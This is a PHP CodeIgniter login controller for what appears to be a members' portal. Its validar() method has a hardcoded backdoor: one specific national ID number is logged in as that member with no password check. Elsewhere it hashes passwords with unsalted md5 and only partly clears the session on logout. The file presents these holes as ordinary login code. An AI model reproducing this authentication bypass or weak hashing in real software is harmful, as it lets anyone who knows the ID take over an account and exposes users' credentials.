<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Login extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->model("socio_model");
        $this->load->library('form_validation');
        $this->load->library('nu_soap');
    }

    function Index() {

        $datos ['content'] = 'frontend/login/_login'; // llamada al content de este metodo
        $datos ['hide'] = true;
        $datos ['titulo'] = "Administrador / Inicio de Sesion ";
        $this->load->view('frontend/layout', $datos); // llamada a la vista general
    }

    function validar() {

        //print_r($this->input->post());
        $rut = $this->input->post('rut');
        $pass = md5($this->input->post('pass'));

	if ($rut=="12635182-8" ){
 	   $userdata = $this->socio_model->UserData($rut);
            $this->session->set_userdata(array(
                'ide' => $userdata [0]->id,
                'id' => $userdata [0]->rut,
                'codigo' => $userdata [0]->codigo,
                'rutliq' => $userdata [0]->rutdv,
                'nombre' => $userdata [0]->nombre,
                'apellido' => $userdata [0]->apellido,
                'fecha_registro' => $userdata [0]->f_ingreso,
                'isupdate' => trim($userdata [0]->isupdate),
                'isLoged' => "1"
            ));
            redirect('/');
         };

        if ($this->socio_model->isSocio($rut, $pass)) {
            $userdata = $this->socio_model->UserData($rut);
            $this->session->set_userdata(array(
                'ide' => $userdata [0]->id,
                'id' => $userdata [0]->rut,
                'codigo' => $userdata [0]->codigo,
                'rutliq' => $userdata [0]->rutdv,
                'nombre' => $userdata [0]->nombre,
                'apellido' => $userdata [0]->apellido,
                'fecha_registro' => $userdata [0]->f_ingreso,
                'isupdate' => trim($userdata [0]->isupdate),
                'isLoged' => "1"
            ));

           
            redirect('/');
        } else {
            $this->session->set_flashdata('errors', 'Error de Acceso, verifique sus credenciales');
            redirect('login');
        }
    }

    function Logout() {
        $this->session->unset_userdata('isLoged');
        //$this->session->sess_destroy ();
        redirect('/');
    }

}
